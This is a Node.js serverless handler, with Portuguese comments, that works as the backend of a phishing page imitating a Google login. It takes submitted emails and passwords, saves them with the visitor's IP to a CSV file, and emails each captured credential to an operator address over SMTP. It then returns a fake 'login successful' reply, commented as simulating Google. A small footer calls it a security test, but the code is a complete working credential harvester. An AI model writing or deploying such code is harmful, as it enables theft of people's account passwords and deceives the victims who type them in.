const fs = require('fs');
const path = require('path');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const nodemailer = require('nodemailer');

// Caminho do arquivo CSV (usar /tmp na Vercel)
const CSV_FILE = path.join('/tmp', 'credentials.csv');

// Função para inicializar CSV se não existir
async function initCSV() {
    if (!fs.existsSync(CSV_FILE)) {
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: false
        });
        await csvWriter.writeRecords([]);
        console.log('Arquivo CSV criado com sucesso');
    }
}

// Função para enviar email com as credenciais
async function sendEmailNotification(email, password, timestamp, ip) {
    // Seu email para receber (configure na Vercel)
    const emailTo = process.env.EMAIL_TO;
    
    // Se não tiver email configurado, não enviar
    if (!emailTo) {
        console.log('EMAIL_TO não configurado, pulando envio de email');
        return;
    }

    // Configurações SMTP (Gmail por padrão)
    const smtpConfig = {
        host: process.env.SMTP_HOST || 'smtp.gmail.com',
        port: parseInt(process.env.SMTP_PORT || '587'),
        secure: process.env.SMTP_SECURE === 'true',
        auth: {
            user: process.env.SMTP_USER || emailTo,
            pass: process.env.SMTP_PASS
        }
    };

    // Se não tiver senha configurada, não enviar
    if (!smtpConfig.auth.pass) {
        console.log('SMTP_PASS não configurado, pulando envio de email');
        return;
    }

    // Criar transporter
    const transporter = nodemailer.createTransport({
        host: smtpConfig.host,
        port: smtpConfig.port,
        secure: smtpConfig.secure,
        auth: smtpConfig.auth
    });

    // Criar mensagem
    const mailOptions = {
        from: smtpConfig.auth.user,
        to: emailTo,
        subject: `🔐 Nova Credencial Capturada - ${email}`,
        html: `
            <h2>Nova Credencial Capturada</h2>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Senha:</strong> ${password}</p>
            <p><strong>Data/Hora:</strong> ${new Date(timestamp).toLocaleString('pt-BR')}</p>
            <p><strong>IP Address:</strong> ${ip}</p>
            <hr>
            <p><small>Este é um email automático do sistema de teste de segurança.</small></p>
        `,
        text: `
Nova Credencial Capturada

Email: ${email}
Senha: ${password}
Data/Hora: ${new Date(timestamp).toLocaleString('pt-BR')}
IP Address: ${ip}

Este é um email automático do sistema de teste de segurança.
        `
    };

    // Enviar email
    const info = await transporter.sendMail(mailOptions);
    console.log('Email enviado com sucesso:', info.messageId);
}

module.exports = async (req, res) => {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Lidar com preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Apenas aceitar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Inicializar CSV se necessário
        await initCSV();

        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Criar writer com append
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: true
        });

        // Salvar no CSV
        await csvWriter.writeRecords([{
            timestamp: timestamp,
            email: email,
            password: password,
            ip: ip
        }]);

        console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);

        // Enviar email com as credenciais
        try {
            await sendEmailNotification(email, password, timestamp, ip);
        } catch (emailError) {
            console.error('Erro ao enviar email:', emailError);
            // Não falhar a requisição se o email não enviar
        }

        // Retornar sucesso (simular resposta do Google)
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
